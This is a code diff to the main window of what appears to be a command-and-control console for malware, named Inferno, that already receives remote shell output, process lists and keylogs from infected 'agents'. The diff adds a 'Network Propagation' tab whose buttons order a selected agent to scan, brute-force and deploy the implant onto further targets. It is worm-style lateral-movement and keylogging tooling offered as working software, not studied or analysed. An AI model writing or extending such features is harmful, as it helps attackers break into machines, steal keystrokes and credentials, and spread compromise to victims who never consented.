@@ -5,6 +5,7 @@
 #include "../../include/ui/components/DataStreamWidget.hpp"
 #include "../../include/ui/components/AgentCardDialog.hpp"
 #include "../../include/ui/components/CommandDialog.hpp"
+#include "../../include/ui/components/PropagationPanel.hpp"
 #include "../../include/ui/StyleSheets.hpp"
 #include "../../include/database/Inferno_Database.hpp"
 #include "../../include/services/IntelAnalysisService.hpp"
@@ -34,6 +35,7 @@ MainWindow::MainWindow(Server* server, QWidget* parent)
     connect(m_server, &Server::shellOutputReceived, this, &MainWindow::onShellOutputReceived);
     connect(m_server, &Server::processListReceived, this, &MainWindow::onProcessListReceived);
     connect(m_server, &Server::keylogReceived, this, &MainWindow::onKeylogReceived);
+    connect(m_server, &Server::propagationResultReceived, this, &MainWindow::onPropagationResult);
     connect(m_server, &Server::statusMessage, this, &MainWindow::onStatusMessage);
 
     // Animation Init
@@ -58,6 +60,35 @@ MainWindow::MainWindow(Server* server, QWidget* parent)
     
     connect(m_intelligencePanel, &IntelligencePanel::forceScanRequested, this, &MainWindow::handleForceScan);
     connect(m_intelligencePanel, &IntelligencePanel::statusMessage, this, &MainWindow::onStatusMessage);
+
+    connect(m_propagationPanel, &PropagationPanel::scanRequested, this, [this](const QString& target) {
+        QString ip = getSelectedAgentIp();
+        if (ip.isEmpty()) {
+            m_propagationPanel->appendResult("SYSTEM", "No agent selected — select an agent first");
+            return;
+        }
+        m_server->sendPropagationCommand(ip, 0, target);
+        m_propagationPanel->appendResult(ip, "SCAN requested on " + target);
+    });
+    connect(m_propagationPanel, &PropagationPanel::bruteRequested, this, [this](const QString& target) {
+        QString ip = getSelectedAgentIp();
+        if (ip.isEmpty()) {
+            m_propagationPanel->appendResult("SYSTEM", "No agent selected — select an agent first");
+            return;
+        }
+        m_server->sendPropagationCommand(ip, 1, target);
+        m_propagationPanel->appendResult(ip, "BRUTE requested on " + target);
+    });
+    connect(m_propagationPanel, &PropagationPanel::deployRequested, this, [this](const QString& target) {
+        QString ip = getSelectedAgentIp();
+        if (ip.isEmpty()) {
+            m_propagationPanel->appendResult("SYSTEM", "No agent selected — select an agent first");
+            return;
+        }
+        m_server->sendPropagationCommand(ip, 2, target);
+        m_propagationPanel->appendResult(ip, "DEPLOY requested on " + target);
+    });
+    connect(m_propagationPanel, &PropagationPanel::statusMessage, this, &MainWindow::onStatusMessage);
 
     // Connect Business Logic Service for real-time notification updates
     connect(&IntelAnalysisService::instance(), &IntelAnalysisService::intelligenceUpdated, this, &MainWindow::handleIntelligenceUpdated);
@@ -160,6 +191,10 @@ void MainWindow::setupUI() {
     // Tab 2: Intelligence Analysis Panel
     m_intelligencePanel = new IntelligencePanel(this);
     m_tabWidget->addTab(m_intelligencePanel, "Intelligence Analysis");
+
+    // Tab 3: Network Propagation Panel
+    m_propagationPanel = new PropagationPanel(this);
+    m_tabWidget->addTab(m_propagationPanel, "Network Propagation");
 
     mainSplitter->addWidget(m_tabWidget);
     mainSplitter->setStretchFactor(0, 1);
@@ -307,6 +342,16 @@ void MainWindow::onKeylogReceived(const QString& ip, const QString& data) {
 
     // Delegate real-time buffer updating and extraction to the service layer
     IntelAnalysisService::instance().processKeylog(uuid, data);
+}
+
+void MainWindow::onPropagationResult(const QString& ip, const QString& result) {
+    m_propagationPanel->appendResult(ip, result);
+}
+
+QString MainWindow::getSelectedAgentIp() const {
+    QListWidgetItem* item = m_agentList->currentItem();
+    if (!item) return {};
+    return item->data(Qt::UserRole).toString();
 }
 
 void MainWindow::onStatusMessage(const QString& message) {
